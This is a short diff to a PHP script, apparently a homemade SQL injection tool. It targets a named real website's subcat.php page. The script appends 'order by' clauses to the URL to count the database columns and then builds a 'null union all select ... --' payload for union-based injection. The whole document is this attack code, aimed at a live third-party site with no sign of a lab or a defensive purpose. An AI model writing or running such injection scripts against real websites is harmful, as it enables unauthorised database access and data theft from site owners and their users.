@@ -20,11 +20,17 @@ var_dump(getError("http://www.bible-history.com/subcat.php?id=22"));
 
 $url = "http://www.bible-history.com/subcat.php?id=22";
 $column = 1;
-if ($column = 1)
+
+if ($column == 1)
 {
 	$orderUrl = $url . " order by " . $column;
 	$column++;
 	$contents = file_get_contents($orderUrl);
-	var_dump($contents);
 }
+
+$column--;
+$getRange = implode (",", range (1,$column));
+$shortUrl = substr_replace($url, "" ,-2);
+$getColumn = $shortUrl . chr(8)."null union all select " . $getRange . "--";
+var_dump($getColumn);
 ?>
